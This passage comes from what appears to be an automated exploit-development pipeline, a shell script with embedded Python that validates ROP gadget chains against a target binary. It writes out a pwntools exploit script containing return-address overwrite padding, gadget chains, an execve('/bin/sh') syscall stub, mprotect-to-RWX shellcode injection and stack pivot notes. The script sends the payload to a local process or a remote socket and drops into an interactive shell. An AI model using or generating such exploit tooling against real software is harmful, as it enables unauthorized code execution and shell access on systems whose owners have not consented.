        ]
        for reg in ("rax","rdi","rsi","rdx","rsp","rbp","rip"):
            if reg in concrete:
                L.append("# %s = %s" % (reg, concrete[reg]))

    L += [
        "",
        "# ── Payload construction ─────────────────────────────────────────────",
    ]

    if offset is not None and primitive == "RETURN_ADDRESS_OVERWRITE":
        L.append("payload  = b'A' * %d  # pad to saved ret addr" % offset)
        for i, g in enumerate(chain_gads):
            tag  = " | ".join(g.get("semantic_tags", [])[:1])
            L.append("payload += p64(%s)  # G%d  %s"
                     % (g.get("sink_address", "0x0"), i + 1, tag))
            # Emit a concrete slot value for the first reg_output, if available
            outs = g.get("reg_outputs", [])
            if outs:
                slot_val = concrete.get(outs[0], "0xdeadbeefdeadbeef")
                L.append("payload += p64(%s)  # → %s" % (slot_val, outs[0]))
    else:
        L += [
            "payload = b''",
            "# Adjust framing for write primitive: %s" % primitive,
            "for a in [%s]:" % ", ".join(
                g.get("sink_address", "0x0") for g in chain_gads),
            "    payload += p64(int(a, 16))",
        ]

    # Goal-specific stubs
    if goal == "SYSCALL_EXECUTION":
        L += [
            "",
            "# ── execve(\"/bin/sh\", NULL, NULL) ──────────────────────────────",
            "# Requirements: rax=59  rdi→\"/bin/sh\\0\"  rsi=0  rdx=0",
            "# pwntools auto-builder (preferred):",
            "# rop.execve(b'/bin/sh\\x00', 0, 0)",
            "# payload += rop.chain()",
            "# Syscall gadget address (find with: ROPgadget --rop --binary ./target):",
            "# payload += p64(syscall_gadget)",
        ]
    elif goal == "ARBITRARY_MEM_WRITE":
        L += [
            "",
            "# ── mprotect(rwx) → inject shellcode ──────────────────────────",
            "# Requirements: rax=10  rdi=target_page  rsi=size  rdx=7",
            "# rop.mprotect(0x400000, 0x1000, 7)",
            "# payload += rop.chain()",
            "# Then write shellcode to the now-writable page and jump there.",
        ]
    elif goal == "STACK_PIVOT_ROP":
        L += [
            "",
            "# ── Stack pivot ──────────────────────────────────────────────────",
            "# Point RSP at a controlled buffer (heap / BSS / mmap'd region),",
            "# then continue the ROP chain from there.",
            "# xchg rsp, rax  (or equivalent pivot gadget)",
        ]

    L += [
        "",
        "# ── Exploit delivery ─────────────────────────────────────────────────",
        "# Local process",
        "p = process('./%s')" % bin_name,
        "# Remote:",
        "# p = remote('127.0.0.1', 4444)",
        "",
        "# If binary prompts, adjust the trigger:",
        "# p.sendlineafter(b'> ', payload)",
        "p.sendline(payload)",
        "p.interactive()",
    ]

    return "\n".join(L) + "\n"

# ══════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════
print("  [*] Loading Phase 0 context...")
p0_ctx = load_phase0(p0_path)
print("  [+] primitive=%-25s  offset=%-6s  ctrl_regs=%s  input_mode=%s" % (
    p0_ctx["write_primitive"],
    str(p0_ctx["controlled_offset"]),
    p0_ctx["controlled_registers"][:4],
    p0_ctx.get("input_mode", "file")))

print("  [*] Loading Phase 2 catalog...")
meta, dep_graph = load_meta_depgraph(catalog_path)
gadgets = list(iter_gadgets(catalog_path))
gid_map = {g["gadget_id"]: g for g in gadgets}
print("  [+] Gadgets: %d  dep edges: %d  RAM: %d MB"
      % (len(gadgets), len(dep_graph), mem_mb()))

# Warm pwntools ELF once (avoids repeated parsing inside the loop)
if HAVE_PWNTOOLS:
    _elf = get_elf(binary)
    if _elf:
        print("  [+] pwntools ELF: arch=%s  pie=%s  nx=%s"
              % (_elf.arch,
                 bool(_elf.pie),
                 bool(_elf.nx)))

# ── Build dependency adjacency + candidate chains (unchanged from original) ──
dep_to = defaultdict(list)
for e in dep_graph:
    dep_to[e["from"]].append(e["to"])

def expl_key(g):
    return (g.get("has_syscall",   False),
            g.get("has_mem_write", False),
            g.get("exploitability_hint", 0))

starters = sorted(
    [g for g in gadgets if g["gadget_id"] in dep_to],
    key=expl_key, reverse=True
)[:MAX_CHAINS]

candidates = []
for g1 in starters:
    for g2id in dep_to.get(g1["gadget_id"], [])[:6]:
        if g2id not in gid_map: continue
        g2 = gid_map[g2id]
        candidates.append([g1, g2])
        for g3id in dep_to.get(g2id, [])[:3]:
            if g3id not in gid_map: continue
            candidates.append([g1, g2, gid_map[g3id]])
    if len(candidates) >= MAX_CHAINS: break

candidates = candidates[:MAX_CHAINS]
print("  [*] Validating %d candidate chains..." % len(candidates))

counts    = defaultdict(int)
results   = []
best_res  = None
best_conf = 0.0

for idx, chain in enumerate(candidates):
    cid      = "CH3_%s" % "_".join(g["gadget_id"] for g in chain)
    all_tags = list(set(t for g in chain for t in g.get("semantic_tags", [])))

    print("  [*] (%d/%d) %s" % (idx + 1, len(candidates), cid[:55]))

    t0  = time.time()
    val = validate_chain(chain, p0_ctx)
    val.setdefault("goal", infer_goal(all_tags))
    val["elapsed_s"] = round(time.time() - t0, 2)

    counts[val["status"]] += 1

    rec = {
        "chain_id":     cid,
        "status":       val["status"],
        "confidence":   val["confidence"],
        "goal":         val.get("goal", "UNKNOWN"),
        "length":       len(chain),
        "gadget_ids":   [g["gadget_id"]    for g in chain],
        "addresses":    [g["sink_address"] for g in chain],
        "semantic_tags":all_tags,
        "block_reasons":val.get("block_reasons", []),
        "concrete_vals":val.get("concrete_vals",  {}),
        "error":        val.get("error",  ""),
        "layer_used":   val.get("layer_used", ""),
        "elapsed_s":    val.get("elapsed_s", 0),
    }
    results.append(rec)

    if (val["confidence"] > best_conf
            and val["status"] in ("CONFIRMED", "PROBABLE")):
        best_conf = val["confidence"]
        best_res  = (chain, val)

    if (idx + 1) % 25 == 0 or idx == len(candidates) - 1:
        print("  [*] Progress %d/%d  CONF:%d  PROB:%d  RAM:%d MB"
              % (idx + 1, len(candidates),
                 counts["CONFIRMED"], counts["PROBABLE"], mem_mb()))

del gadgets, dep_graph
gc.collect()

print("  [+] CONFIRMED:%d  PROBABLE:%d  UNLIKELY:%d  BLOCKED:%d"
      % (counts["CONFIRMED"], counts["PROBABLE"],
         counts["UNLIKELY"],  counts["BLOCKED"]))

# ── Payload sketch ────────────────────────────────────────────────────────
payload_code = ""
if best_res:
    c_gads, c_val = best_res
    payload_code  = gen_payload(c_gads, c_val, p0_ctx)
    with open(payload_path, "w") as fh:
        fh.write(payload_code)
    print("  [+] Payload sketch -> %s" % payload_path)
else:
    print("  [!] No actionable chain found — payload sketch not written.")

# ── Output  (format identical to original Phase 3 → Phase 4 compatible) ──
results.sort(key=lambda r: r["confidence"], reverse=True)
env = p0_ctx["runtime_env"]

output = {
    "phase":         3,
    "binary":        binary,
    "generated_at":  datetime.utcnow().isoformat() + "Z",
    "validation_tools": {
        "frida":    HAVE_FRIDA,
        "pwntools": HAVE_PWNTOOLS,
        "ropper":   HAVE_ROPPER,
        "angr":     False,     # explicit false — angr removed
    },
    "runtime_info": {
        **env,
        "write_primitive":      p0_ctx["write_primitive"],
        "controlled_offset":    p0_ctx["controlled_offset"],
        "controlled_registers": p0_ctx["controlled_registers"],
        "phase0_vuln_id":       p0_ctx.get("vuln_id", ""),
        "requires_aslr_leak":   (env.get("pie_binary", True)
                                 and env.get("aslr_level", 2) >= 2),
    },
    "validation_summary": dict(counts),
    "best_chain_id":      (results[0]["chain_id"]   if results else ""),
    "best_confidence":    (results[0]["confidence"] if results else 0.0),
    "payload_sketch":     payload_path if payload_code else "",
    "validated_chains":   results,
}

with open(output_path, "w") as fh:
    json.dump(output, fh, indent=2)
print("  [+] Output -> %s  RSS:%d MB" % (output_path, mem_mb()))
PYEOF

# ── Terminal summary ──────────────────────────────────────────────────────
printf "\n"
printf "${BOLD}%s${NC}\n" "======================================================="
printf "${BOLD}  PHASE 3 COMPLETE${NC}\n"
printf "${BOLD}%s${NC}\n" "======================================================="
printf "\n"

python3 -c "
import json, os
with open('$OUTPUT_FILE') as f:
    d = json.load(f)
v  = d['validation_summary']
ri = d['runtime_info']
tl = d.get('validation_tools', {})

print('  Validation layers used:')
print('    frida    : %s' % tl.get('frida',    False))
print('    pwntools : %s' % tl.get('pwntools', False))
print('    ropper   : %s' % tl.get('ropper',   False))
print()
print('  CONFIRMED : %d' % v.get('CONFIRMED', 0))
print('  PROBABLE  : %d' % v.get('PROBABLE',  0))
print('  UNLIKELY  : %d' % v.get('UNLIKELY',  0))
print('  BLOCKED   : %d' % v.get('BLOCKED',   0))
print()
print('  Best chain  : %s' % d['best_chain_id'][:60])
print('  Confidence  : %.3f' % d['best_confidence'])
print('  Primitive   : %s'  % ri['write_primitive'])
print('  Offset      : %s'  % ri['controlled_offset'])
print('  Needs leak  : %s'  % ri['requires_aslr_leak'])
print()
top = d['validated_chains'][:3]
if top:
    print('  Top chains:')
    for i, c in enumerate(top, 1):
        print('    [%d] %-10s conf=%.3f  %-26s  via=%s'
              % (i, c['status'], c['confidence'],
                 c['goal'], c.get('layer_used','?')))
        if c.get('concrete_vals'):
            vals = {k: v for k, v in c['concrete_vals'].items()
                    if k in ('rax','rdi','rsi','rdx')}
            if vals:
                print('        regs: %s'
                      % '  '.join('%s=%s' % (k, v)
                                  for k, v in sorted(vals.items())))
"

printf "\n"
ok "Validated chains -> $OUTPUT_FILE"
[ -f "$PAYLOAD_FILE" ] && ok "Payload sketch   -> $PAYLOAD_FILE"
printf "\n"
printf "${YELLOW}Next step:${NC}  ./phase4_vulnerability_scoring.sh -i %s\n" \
    "$OUTPUT_FILE"
